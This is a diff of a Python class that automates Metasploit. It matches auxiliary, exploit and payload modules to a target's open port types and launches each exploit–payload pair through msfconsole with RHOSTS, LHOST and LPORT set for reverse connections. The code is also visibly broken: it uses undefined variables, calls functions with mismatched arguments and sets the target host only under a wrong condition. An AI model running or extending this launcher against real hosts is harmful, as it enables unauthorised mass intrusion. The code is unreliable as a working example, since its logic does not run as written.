@@ -8,6 +8,14 @@ from threading import Thread
 import time
 
 
+
+#            # ? I don't yet know how to use these.. :|
+#            #meta_pos_ = self.FM.read_file("meta_lists_/post.txt", "\n")
+#            #meta_nop_ = self.FM.read_file("meta_lists_/nops.txt", "\n")
+#            #meta_enc_ = self.FM.read_file("meta_lists_/encoder.txt", "\n")
+
+
+
 class MetaFab():
     def __init__(self, **kw):
         super(MetaFab, self).__init__(**kw)
@@ -20,11 +28,11 @@ class MetaFab():
     def build_auxi(self, target_, port_, module_, dest_):
         try:
             meta_   = " msfconsole -q -x "
-            use_    = f"use {module_};"
-            rhost_  = f"set RHOSTS {target_};"
-            rport_  = f"set RPORT {port_};"
+            use_    = f" ' use {module_};"
+            rhost_  = f" set RHOST {target_};"
+            rport_  = f" set RPORT {port_};"
             run_    = " run;"
-            exit_   = " exit;"
+            exit_   = " exit; ' "
 
             to_run = meta_+use_+rhost_+rport_+run_+exit_
             #print(f"\n!****!\n[TO_RUN_AUXI]:\n>>[>{str(to_run)}<]")
@@ -48,21 +56,33 @@ class MetaFab():
         except Exception as e:
             print(f"[E_!]:[AUXI_THREAD]:[>{str(e)}<]")
 
+    # ! START AUXILIARY NO-THREAD*
+    def auxi_set_(self, i_, target_, port_, module_, dest_):
+        try:
+            # ! FILTER MODULE_DATA -> MOD_DIR
+            mod_ = str(module_.split(" ")[0])
+            print(f"[NEW_AUX_THREAD]:[{str(i_)}]")  #:[{str(mod_)}]")
+            print(f"[DEST_]:[{str(dest_)}]")
+            self.build_auxi(target_, port_, mod_, dest_)
+        except Exception as e:
+            print(f"[E_!]:[AUXI_THREAD]:[>{str(e)}<]")
+
 
     # ? EXPLOITS
     # ! BUILD EXPLOIT CMD_STR FOR CLI
     def build_xploit(self, target_, port_, l_host, l_port, module_, payload_, dest_):
         try:
             meta_   = " msfconsole -q -x "
-            use_0   = f"'use {module_};"
-            use_1   = f"use {payload_};"
-            rhost_  = f"set RHOSTS {target_};"
-            rport_  = f"set RPORT {port_};"
-            l_host  = f"set LHOST {l_host};"
-            l_port  = f"set LPORT {l_port};"
-
+            use_0   = f" 'use {module_};"
+            use_1   = f" use {payload_};"
+            if l_host:
+                rhost_  = f" set RHOSTS {target_};"
+            if l_host:
+                rport_  = f" set RPORT {port_};"
+            l_host  = f" set LHOST {l_host};"
+            l_port  = f" set LPORT {l_port};"
             run_    = " run;"
-            exit_   = " exit'"
+            exit_   = " exit; ' "
 
             to_run = meta_+use_0+use_1+l_host+l_port+rhost_+rport_+run_+exit_
             #print(f"\n!****!\n[TO_RUN_EXPL]:\n>>[>{str(to_run)}<]")
@@ -87,68 +107,157 @@ class MetaFab():
             print(f"[E_!]:[EXPL_THREAD]:[>{str(e)}<]")
 
 
-    # ! SEARCH MATCHING CONFIGS
-    def check_port_conf(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_):
+    # ! START EXPLOT NON-THREAD*
+    def expl_set_(self, i_, j_, target_, port_, l_host, l_port,  module_, payload_, dest_):
         try:
- 
-            # ! FILTER PORT_DATA -> NUMBER
-            print(f"[FULL_PORT_VAL]:[>{port_str}<]")
-            port_ = str(port_str)    #.split("/")[0])
-            print(f"[PORT_NUMBER]:[>{str(port_)}<]")
-            # ! COLLECT EACH LIST
-            meta_aux_ = self.FM.read_file("meta_lists_/auxiliary.csv", "\n")
-            meta_exp_ = self.FM.read_file("meta_lists_/exploit.csv", "\n")
-            meta_pay_ = self.FM.read_file("meta_lists_/payload.csv", "\n")
-
-            # ? I don't yet know how to use these.. :|
-            #meta_pos_ = self.FM.read_file("meta_lists_/post.csv", "\n")
-            #meta_nop_ = self.FM.read_file("meta_lists_/nops.csv", "\n")
-            #meta_enc_ = self.FM.read_file("meta_lists_/encoder.csv", "\n")
-
-            # ! CONFIG BUILDS
-            each_aux_ = []
-            each_exp_ = []
-            each_pay_ = []
-
-            print("@@@[LEN_AUXI_LIST]",str(len(meta_aux_)), "\n")
-            print("@@@[LEN_EXPL_LIST]",str(len(meta_exp_)), "\n")
-            print("@@@[LEN_PAYL_LIST]",str(len(meta_pay_)), "\n")
-
-            # ! FIND MATCHES
-            # ? AUXILIARY
-            for i, aux_ in enumerate(meta_aux_):
-                print(f"~~[AUI_I_]:[I]:[>{str(i)}<]")
-                if str(p_type) in str(aux_):
-                    print(f"-- [CONFIG]:[AUX]:[{str(i)}]")  # -[>{str(aux_)}<]")
-                    # ! ADD TO REPORT LIST 'AUX_'
-                    #this_aux_ = str(aux_)
-                    auxi_file = meta_dir+f"auxi_{str(port_)}_{str(i)}_.csv"
-                    print("[USING_DIR]:",str(auxi_file))
-                    #each_aux_.append(this_aux_)
-                    time.sleep(1)
-                    self.auxi_thread(i, target_, port_, aux_, auxi_file)
-
-
-            # ? EXPLOIT
-            for k, exp_ in enumerate(meta_exp_):
-                print(f"~~[EXPL_K_]:[K]:[>{str(k)}<]")
-                if str(p_type) in str(exp_):
-                    print(f"-- [CONFIG]:[EXP]:[{str(k)}]") # -[>{str(exp_)}<]")
-                    # ? PAYLOAD
-                    for j, pay_ in enumerate(meta_pay_):
-                        print(f"-- -- [EXP]--[PAY]:[J]:[{str(j)}]")  #-[[>{str(pay_)}<]] ")
-                        # ! ADD TO REPORT LIST 'PAY_'
-                        #this_pay_ = str(pay_)
-                        #each_pay_.append(this_pay_)
-                        expl_file = meta_dir+f"expl_{str(port_)}_{str(k)}_{str(j)}_.csv"
-
-                        self.expl_thread(k,j, target_, port_, l_host, l_port, exp_, pay_, expl_file)
-
-                    # ! ADD TO REPORT LIST 'EXPL_'
-                    #each_exp_.append(each_pay_)
-                    #each_pay_ = []
+            # ! FILTER MODULE_DATA -> MOD_DIR
+            mod_ = str(module_.split(" ")[0])
+            # ! FILTER PAYLOAD_DATA -> PAYLOAD_DIR
+            pay_ = str(payload_.split(" ")[0])
+            print(f"[NEW_XPL_THREAD]:[{str(i_)}]:[{str(j_)}]")
+            self.build_xploit(target_, port_, module_, pay_, dest_)
         except Exception as e:
-            print(f"[E]:[CHECK_PORT]:[{str(e)}]")
+            print(f"[E_!]:[EXPL_THREAD]:[>{str(e)}<]")
+
+
+
+
+
+
+
+
+
+
+    # ! SEARCH MATCHING AUXILIARIES
+    def collect_auxi_list(self, p_type):
+        try:
+            print(f"[FETCHING_AUXILIARIES]\n^^^^^^^^^^^^^^^")
+            print("[.     ]")
+            auxi_list = []
+            time.sleep(0.5)
+            print("[..    ]")
+            # ! COLLECT EACH LIST
+            meta_aux_ = self.FM.read_file_str("meta_lists_/auxiliary.txt")
+            print("[...   ]")
+            my_auxi = str(meta_aux_).split(",")
+            print("[....  ]")
+            for met in my_auxi:
+                if str(p_type).upper() not in str(met).upper():
+                    pass
+                else:
+                    da_aux_ = str(met).split(" ")
+                    for da_ in da_aux_:
+                        if "aux" in str(da_):
+                            final_aux_val = str(da_)[1:]
+                            auxi_list.append(final_aux_val)
+            print("[..... ]")
+            print(f"[NUMBER_OF_MaTCHING_AUXI_]:[>{str(len(auxi_list))}<]")
+            print("[......]")
+            return auxi_list
+        except Exception as e:
+            print(f"[E]:[COLLECT_AUXI_LIST]:[{str(e)}]")
+
+    # ! SEARCH MATCHING EXPLOITS
+    def collect_expl_list(self, p_type):
+        try:
+            print(f"[FETCHING_EXPLOITS]\n^^^^^^^^^^^^^^^")
+            print("[.     ]") 
+            expl_list = []
+            print("[..    ]")
+            time.sleep(0.5)
+            # ! COLLECT EACH LIST
+            meta_expl_ = self.FM.read_file_str("meta_lists_/exploit.txt")
+            print("[...   ]")
+            my_expl = str(meta_expl_).split(",")
+            print("[....  ]")
+            for met in my_expl:
+                if str(p_type).upper() not in str(met).upper():
+                    pass
+                else:
+                    da_expl_ = str(met).split(" ")
+                    for da_ in da_expl_:
+                        if "exp" in str(da_):
+                            final_expl_val = str(da_)[1:]
+                            expl_list.append(final_expl_val)
+            print("[..... ]")
+            print(f"[NUMBER_OF_MaTCHING_EXPL_]:[>{str(len(expl_list))}<]")
+            print("[......]")
+            return expl_list
+        except Exception as e:
+            print(f"[E]:[COLLECTING_EXPLOITS]:[{str(e)}]")
+
+    # ! SEARCH MATCHING PAYLOADS
+    def collect_payl_list(self, p_type):
+        try:
+            print(f"[FETCHING_PAYLOADS]\n^^^^^^^^^^^^^^^")
+            print("[.     ]")
+            expl_list = []
+            time.sleep(0.5)
+            # ! COLLECT EACH LIST
+            meta_expl_ = self.FM.read_file_str("meta_lists_/payload.txt")
+            print("[...   ]")
+            my_expl = str(meta_expl_).split(",")
+            print("[....  ]")
+            for met in my_expl:
+                if str(p_type).upper() not in str(met).upper():
+                    pass
+                else:
+                    da_expl_ = str(met).split(" ")
+                    for da_ in da_expl_:
+                        if "pay" in str(da_):
+                            final_expl_val = str(da_)[1:]
+                            expl_list.append(final_expl_val)
+            print("[..... ]")
+            print(f"[NUMBER_OF_MaTCHING_PAYL_]:[>{str(len(expl_list))}<]")
+            print("[......]")
+            return expl_list
+        except Exception as e:
+            print(f"[E]:[COLLECTING_PAYLOADS]:[{str(e)}]")
+
+
+
+
+    # ! BUILD CONFIGS
+    def collect_configs(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_):
+        try:
+            print(f"[COLLECTING_CONFIGS]\n[TEST_#]:[>{str(i_)}<]\n[L_HOST]:[>{str(l_host)}<]\n[L_PORT]:[>{str(l_port)}<]\n[TARGET]:[>{str(target_)}<]\n[P_TYPE]:[>{str(p_type)}<]\n[F_DEST]:[>{str(meta_dir)}<]")
+            my_auxi_ = self.collect_auxi_list(p_type)
+            my_expl_ = self.collect_expl_list(p_type)
+            my_payl_ = self.collect_payl_list(p_type)
+
+            if "Y" in str(thr_).upper():
+                print("[RUNNING_AUXI_THREADS]\n^^^^^^^^^^^^^")
+                for i, aux in enumerate(my_auxi_):
+                    print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
+                    dest_ = meta_dir+f"aux_{str(i_)}_{str(i)}_.txt"
+                    self.auxi_thread(i_, target_, port_str, aux, dest_)
+                print("[RUNNING_EXPLOIT_THREADS]\n^^^^^^^^^^^^^")
+                for j, exp in enumerate(my_expl_):
+                    print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
+                    for k, pay in enumerate(my_payl_):
+                        print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
+                        dest_ = meta_dir+f"expl_{str(i_)}_{str(i)}_.txt"
+                        self.expl_thread(j, k, target_, port_, l_host, l_port,  module_, payload_, dest_)
+
+
+
+            if "N" in str(thr_).upper():
+                print("[RUNNING_AUXI_SETS]\n^^^^^^^^^^^^^")
+                for i, aux in enumerate(my_auxi_):
+                    print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
+                    dest_ = meta_dir+f"/aux_{str(i_)}_{str(i)}_.txt"
+                    self.auxi_set_(i_, target_, port_str, aux, dest_)
+                print("[RUNNING_EXPLOIT_SETS]\n^^^^^^^^^^^^^")
+                for j, exp in enumerate(my_expl_):
+                    print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
+                    for k, pay in enumerate(my_payl_):
+                        print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
+                        self.expl_set_(j, k, target_, port_, l_host, l_port,  module_, payload_, dest_)
+
+
+
+        except Exception as e:
+            print(f"[E]:[COLLECT_CONFIGS]:[>{str(e)}<]")
 
 
     # ! CHECK PORT TYPE
@@ -203,19 +312,9 @@ class MetaFab():
 
 
     # ! START 'McBRETA' _STACK_
-    def set_meta_stack_(self, l_host, l_port, target_, prof_dir, type_, tcp_):
-        print(f"[RUNNING]:[SET_META_LAB]:[>{target_}<]:[>{type_}<]")
+    def set_meta_stack_(self, l_host, l_port, target_, prof_dir, type_, tcp_, thr_):
+        print(f"[RUNNING]:[SET_META_LAB]:[>{target_}<]:[>{type_}<]:[>{tcp_}<]")
         try:
-            ## ! USE IP_ 
-            #try:
-            #    if type_ == "URL":
-            #        try:
-            #            IP_ = self.MS.dis_lookup(target_)
-            #            print(f"[FETCHING]:[IP_]:[>{str(IP_)}<]")
-            #        except Exception as e:
-            #            print(f"[E]:[URL-to-IP]:[>{str(e)}<]")
-            #except Exception as e:
-            #    print(f"[E]:[GET_IP]:[{str(e)}]")
             meta_dir = prof_dir+"/meta_dir/"
             self.FM.make_dir(meta_dir)
 
@@ -226,10 +325,13 @@ class MetaFab():
                         print(f"[X]:[RUNNING_]:\n    [#]:[{str(i)}]:\n    [PORT]:[{str(val)}]\n")
                         # ! CHECK PORT CONFIGS
                         p_type = self.check_port_type(val)
-                        self.check_port_conf(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i)
+                        self.collect_configs(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i, thr_)
                         time.sleep(5)
+                    print("[ALL_ATTACKS_RAN]")
                 except Exception as e:
                     print(f"[E]:[RUN_LOAD_PORTS_]:[{str(e)}]")
+            else:
+                print("[NO_TCP_LIST]")
 
         except Exception as e:
             print(f"[E]:[SET_META_STACK]:[{str(e)}]")
